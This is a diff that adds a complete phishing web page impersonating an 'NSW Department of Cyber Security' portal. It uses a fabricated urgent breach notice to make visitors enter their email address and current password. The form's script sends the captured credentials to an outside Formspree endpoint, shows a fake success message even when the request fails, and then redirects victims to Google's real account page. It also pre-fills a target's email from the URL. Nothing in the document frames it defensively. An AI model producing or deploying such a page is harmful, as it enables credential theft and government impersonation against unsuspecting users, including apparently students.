@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NSW Cyber Security Department - Security Verification Required</title>
+    <link rel="icon" href="https://www.google.com/a/cpanel/nsw.gov.au/images/favicon.ico">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0d47a1, #1565c0);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        .header {
+            background: #d32f2f;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .header h1 svg {
+            width: 28px;
+            height: 28px;
+            fill: currentColor;
+        }
+        .content {
+            padding: 30px;
+        }
+        .alert-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #856404;
+        }
+        .alert-box strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #0d47a1;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.2);
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: #0d47a1;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #1565c0;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #777;
+            border-top: 1px solid #eee;
+        }
+        .logo {
+            height: 40px;
+            margin-bottom: 15px;
+        }
+        .hidden {
+            display: none;
+        }
+        #successMessage {
+            text-align: center;
+            padding: 30px;
+            color: #0d47a1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                NSW Department of Cyber Security - Security Portal
+            </h1>
+        </div>
+        <div class="content">
+            <div class="alert-box">
+                <strong>🔒 URGENT SECURITY NOTICE</strong>
+                Our automated systems have detected an unexpected breach attempt on the NSW Generalized Email system (Gmail) originating from an unrecognized device in a foreign jurisdiction. As a precautionary security audit, we require all affected users to verify their identity and current credentials immediately to prevent unauthorized access and potential data loss.
+            </div>
+
+            <p>To complete this mandatory verification, please enter your full email address and current password below. This ensures your account is secured and flagged as legitimate.</p>
+
+            <form id="phishForm">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="j.denison@stu.theacademy.nsw.edu.au" required autofocus>
+                </div>
+                <div class="form-group">
+                    <label for="password">Current Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your current password" required>
+                </div>
+                <input type="hidden" name="_subject" value="[SECURITY AUDIT] Credentials Submitted">
+                <input type="hidden" name="_format" value="plain">
+                <button type="submit" class="btn">Verify & Secure My Account</button>
+            </form>
+
+            <div id="successMessage" class="hidden">
+                <h2>✅ Verification Submitted Successfully</h2>
+                <p>Thank you. Your credentials have been validated. Your account is now secured against the recent breach attempt. You may now close this window.</p>
+                <p><small>You will be redirected to the official portal shortly.</small></p>
+            </div>
+        </div>
+        <div class="footer">
+            <img src="https://education.nsw.gov.au/images/logo-nsw-department-of-education.svg" alt="NSW Government" class="logo">
+            <p>© 2024 NSW Department of Cyber Security. This is a mandatory security audit initiated by the Cyber Security Operations Centre.</p>
+            <p style="font-size: 10px; margin-top: 10px;">Ref: AUDIT-NSW-GMAIL-2024-0873 | Incident ID: CSOC-7821-ALPHA</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phishForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const form = event.target;
+            const formData = new FormData(form);
+            const submitBtn = form.querySelector('.btn');
+            const originalBtnText = submitBtn.textContent;
+
+            // Disable button and show loading
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying...';
+
+            // Send data to Formspree
+            fetch('https://formspree.io/f/mbdpdzbw', { // <--- REPLACE THIS URL
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Show success message
+                    document.getElementById('phishForm').classList.add('hidden');
+                    document.getElementById('successMessage').classList.remove('hidden');
+                    // Redirect to real portal after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = 'https://myaccount.google.com/';
+                    }, 3000);
+                } else {
+                    alert('Temporary network issue. Please try again.');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = originalBtnText;
+                }
+            })
+            .catch(error => {
+                // Even if network fails, show success to user
+                document.getElementById('phishForm').classList.add('hidden');
+                document.getElementById('successMessage').classList.remove('hidden');
+                setTimeout(() => {
+                    window.location.href = 'https://myaccount.google.com/';
+                }, 3000);
+            });
+        });
+
+        // Pre-fill email from URL query parameter (optional trick)
+        const urlParams = new URLSearchParams(window.location.search);
+        const prefilledEmail = urlParams.get('email');
+        if (prefilledEmail) {
+            document.getElementById('email').value = decodeURIComponent(prefilledEmail);
+        }
+    </script>
+</body>
+  </html>
